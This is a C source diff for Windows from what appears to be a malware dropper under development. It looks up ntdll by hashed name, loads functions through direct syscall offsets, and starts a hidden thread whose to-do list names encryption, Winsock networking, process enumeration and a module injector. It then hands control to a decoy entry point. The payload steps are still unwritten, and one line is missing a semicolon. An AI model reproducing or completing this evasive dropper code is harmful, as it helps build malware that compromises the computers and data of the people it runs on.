@@ -3,6 +3,7 @@
 #include <ntapi.h>
 #include <instance.h>
 #include <crypto\crc32.h>
+#include <decoy\entry.h>
 #include "ntapi\ntapi.h"
 
 enum {
@@ -18,20 +19,20 @@ BOOL
 DECLSPEC_DEPRECATED_S("Temporary")
 LoadBasicFunctions(VOID)
 {
-    $DLOG0(DLG_FLT_INFO, "Loading ntapi");
+    $DLOG1(DLG_FLT_INFO, "Loading ntapi");
 
     HMODULE hModule;
 
     if (IS_NULL(hModule = LdrGetModule(NtdllStrxsum ^ HASH_NTDLL_KEY))) {
         /* For future versions, you never know */
         if (IS_NULL(hModule = LdrGetModule(NtdllStrxsumAlt ^ HASH_NTDLLALT_KEY))) {
-            $DLOG0(DLG_FLT_CRITICAL, "Failed to find ntdll.dll");
+            $DLOG1(DLG_FLT_CRITICAL, "Failed to find ntdll.dll");
 
             return FALSE;
         }
     }
 
-    $DLOG2(DLG_FLT_DEFAULT, "ntdll.dll = 0x%p", hModule);
+    $DLOG3(DLG_FLT_DEFAULT, "ntdll.dll = 0x%p", hModule);
 
 #if SCFG_DROPPER_NTAPI_INIT_USE_SYSCALLS == ON
     if (FALSE) {
@@ -52,10 +53,10 @@ LoadBasicFunctions(VOID)
             );
 
         if (dwFunctionsImported != NtapiSyscallsFunctionsCount) {
-            $DLOG0(DLG_FLT_CRITICAL, "Imported %lu from %lu", dwFunctionsImported, NtapiSyscallsFunctionsCount);
+            $DLOG1(DLG_FLT_CRITICAL, "Imported %lu from %lu", dwFunctionsImported, NtapiSyscallsFunctionsCount);
         }
     } else {
-        PULONG_PTR dwSyscallOffset = (PULONG_PTR)(Config.Cpu.bUnderWow64 ? &NtapiSyscallsOffsetWow64 : &NtapiSyscallsOffsetX86) + (Config.NtVersion.dwCommonIndex * NtapiSyscallsFunctionsCount);
+        PULONG32_PTR dwSyscallOffset = (PULONG32_PTR)(Config.Cpu.bUnderWow64 ? &NtapiSyscallsOffsetWow64 : &NtapiSyscallsOffsetX86) + (Config.NtVersion.dwCommonIndex * NtapiSyscallsFunctionsCount);
 
         PRAGMA_LOOP_UNROLL_N(16)
         for (ULONG_PTR i = 0; i != NtapiSyscallsFunctionsCount; i++) {
@@ -63,22 +64,41 @@ LoadBasicFunctions(VOID)
         }
     }
 
-    $DLOG1(DLG_FLT_INFO, "Done");
+    $DLOG2(DLG_FLT_INFO, "Done");
 
     return TRUE;
 }
 
-VOID
-TEest(VOID);
+DWORD
+WINAPI
+IndependetThread()
+{
+    #ifdef DEBUG
+        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_DROPPER_THREAD1);
+
+        $DLogInitialize(&DebugName, TRUE);
+    #endif
+
+    /*
+    TODO:
+        ValidateConfig
+        AES256
+        Winsock
+        Process enum
+        Module injector
+    */
+
+    return 0;
+}
 
 ULONG
 WINAPI
 InitialEntry(VOID)
 {
     #ifdef DEBUG
-        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_DROPPER_THREAD0_DOS);
+        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_DROPPER_THREAD0);
 
-        $DLogInitialize(&DebugName, 0x1000);
+        $DLogInitialize(&DebugName, TRUE);
     #endif
 
     if (!InitConfig()) {
@@ -89,29 +109,36 @@ InitialEntry(VOID)
         return 0;
     }
 
-    PVOID pBase = NULL;
-    SIZE_T cbBase = PAGE_SIZE;
+    InitCrc32();
 
-    $DLOG0(DLG_FLT_HIGHLIGHT, "%08lX", NT_SUCCESS(NtAllocateVirtualMemory(NtCurrentProcess(), &pBase, 0, &cbBase, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)));
+#if SCFG_IGNORE_ISTANCE == ON
+    CreateInstance()
 
-    //TODO:
-    //    LZO
+    if (TRUE) {
+#else
+    if (CreateInstance()) {
+#endif
+        HANDLE hThread;
 
-     InitCrc32();
+        if (!NT_ERROR(NtCreateThreadEx(
+            &hThread,
+            STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL,
+            NULL,
+            NtCurrentProcess(),
+            IndependetThread,
+            (PVOID)RTLP_LCG_NATIVE,
+            0,
+            0,
+            PAGE_SIZE,
+            PAGE_SIZE,
+            NULL
+        ))) {
+            $DLOG1(DLG_FLT_DEFAULT, "New thread started!");
+        } else {
+            $DLOG1(DLG_FLT_CRITICAL, "Failed to create new thread!");
+        }
+    }
 
- #if SCFG_IGNORE_ISTANCE == ON
-     CreateInstance()
-
-     if (TRUE) {
- #else
-     if (CreateInstance()) {
- #endif
-        
-     }
-
-
-    // TODO: Execute DECOY
-
-    return 0;
+    return DecoyEntry();
 }
  
